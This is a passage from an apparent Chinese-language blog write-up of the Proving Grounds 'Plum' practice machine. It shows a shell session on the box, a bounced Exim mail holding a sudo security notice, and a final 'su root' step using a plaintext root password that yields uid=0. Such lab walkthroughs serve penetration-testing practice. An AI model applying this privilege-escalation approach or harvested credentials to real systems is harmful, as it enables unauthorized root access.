+</span></span></span><span class="line"><span class="cl"><span class="s2">To: www-data@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">References: &lt;E1rABI6-0004Rn-TK@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Type: multipart/report; report-type=delivery-status; boundary=1701705326-eximdsn-1486237684
+</span></span></span><span class="line"><span class="cl"><span class="s2">MIME-Version: 1.0
+</span></span></span><span class="line"><span class="cl"><span class="s2">Subject: Mail delivery failed: returning message to sender
+</span></span></span><span class="line"><span class="cl"><span class="s2">Message-Id: &lt;E1rABI6-0004Rq-Tm@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Date: Mon, 04 Dec 2023 10:55:26 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">--1701705326-eximdsn-1486237684
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-type: text/plain; charset=us-ascii
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">This message was created automatically by mail delivery software.
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">A message that you sent could not be delivered to one or more of its
+</span></span></span><span class="line"><span class="cl"><span class="s2">recipients. This is a permanent error. The following address(es) failed:
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">  debian@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">    (generated from root@localhost)
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Unrouteable address
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">--1701705326-eximdsn-1486237684
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-type: message/delivery-status
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Reporting-MTA: dns; localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Action: failed
+</span></span></span><span class="line"><span class="cl"><span class="s2">Final-Recipient: rfc822;root@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">Status: 5.0.0
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">--1701705326-eximdsn-1486237684
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-type: message/rfc822
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Return-path: &lt;www-data@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Received: from www-data by localhost with local (Exim 4.94.2)
+</span></span></span><span class="line"><span class="cl"><span class="s2">        (envelope-from &lt;www-data@localhost&gt;)
+</span></span></span><span class="line"><span class="cl"><span class="s2">        id 1rABI6-0004Rn-TK
+</span></span></span><span class="line"><span class="cl"><span class="s2">        for root@localhost; Mon, 04 Dec 2023 10:55:26 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">To: root@localhost
+</span></span></span><span class="line"><span class="cl"><span class="s2">Auto-Submitted: auto-generated
+</span></span></span><span class="line"><span class="cl"><span class="s2">Subject: *** SECURITY information for localhost ***
+</span></span></span><span class="line"><span class="cl"><span class="s2">From: www-data &lt;www-data@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Message-Id: &lt;E1rABI6-0004Rn-TK@localhost&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Date: Mon, 04 Dec 2023 10:55:26 -0500
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">localhost : Dec  4 15:55:26 : www-data : a password is required ; PWD=/home ; USER=root ; COMMAND=list
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">--1701705326-eximdsn-1486237684--
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">www-data@plum:/tmp</span>$<span class="s2"> </span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/proving-grounds-plum/resource/3-plum.assets/image-20231205002108816.png" alt="image-20231205002108816" srcset="/posts/proving-grounds-plum/resource/3-plum.assets/image-20231205002108816.png?size=small, /posts/proving-grounds-plum/resource/3-plum.assets/image-20231205002108816.png?size=medium 1.5x, /posts/proving-grounds-plum/resource/3-plum.assets/image-20231205002108816.png?size=large 2x" data-title="image-20231205002108816" style="--width: 1382px;--aspect-ratio: 1382 / 1230;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@plum:/tmp$ su root
+</span></span><span class="line"><span class="cl">su root
+</span></span><span class="line"><span class="cl">Password: 6s8kaZZNaZZYBMfh2YEW
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2023-12-05 10:08:29">更新于 2023-12-05&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/oscp/" class="post-tag" title="标签 - OSCP">OSCP</a><a href="/tags/pg_practice/" class="post-tag" title="标签 - PG_Practice">PG_Practice</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/proving-grounds-codo/" class="post-nav-item" rel="prev" title="Proving Grounds Codo WriteUp"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Proving Grounds Codo WriteUp</a><a href="/posts/provinggrounds-hub/" class="post-nav-item" rel="next" title="ProvingGrouds Hub WriteUp">ProvingGrouds Hub WriteUp<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"twemoji":true,"version":"v0.3.16"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
